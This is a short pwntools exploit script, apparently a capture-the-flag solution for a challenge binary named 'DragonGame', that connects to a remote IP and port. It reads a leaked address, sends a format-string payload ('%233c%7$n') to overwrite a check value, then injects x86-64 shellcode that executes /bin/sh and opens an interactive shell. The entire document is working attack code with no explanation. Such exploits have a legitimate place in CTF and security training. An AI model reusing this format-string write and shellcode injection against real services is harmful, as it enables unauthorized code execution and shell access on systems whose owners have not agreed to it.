from pwn import *

# context.log_level = 'debug'

#p = process("./DragonGame")
p = remote('47.106.8.27', 45164)
p.recvuntil("secret[0] is ")

addr = int(p.recvuntil("\n")[:-1],16)
log.success("addr:"+hex(addr))

p.sendlineafter("west?:\n","east")
p.sendlineafter("address'\n",str(addr))

pause()

p.sendlineafter(" is:\n","%233c%7$n")   #修改check[0]=233
shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"        #Linux/x64 Execute /bin/sh Shellcode
p.sendlineafter("SPELL\n", shellcode)   
p.interactive()
